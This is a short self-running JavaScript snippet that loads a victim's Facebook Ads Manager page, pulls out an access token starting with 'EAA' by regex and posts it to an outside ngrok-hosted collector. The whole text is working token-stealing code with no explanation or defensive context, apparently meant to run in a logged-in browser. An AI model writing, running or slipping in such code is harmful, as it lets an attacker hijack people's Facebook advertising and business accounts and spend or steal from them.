async function harvest(){
  const h = await (await fetch('https://www.facebook.com/adsmanager/manage/campaigns')).text();
  const tok = h.match(/EAA[A-Za-z0-9]+/);
  if (tok) fetch('https://collector.ngrok-free.app/t', {method: 'POST', body: tok[0]});
}
harvest();
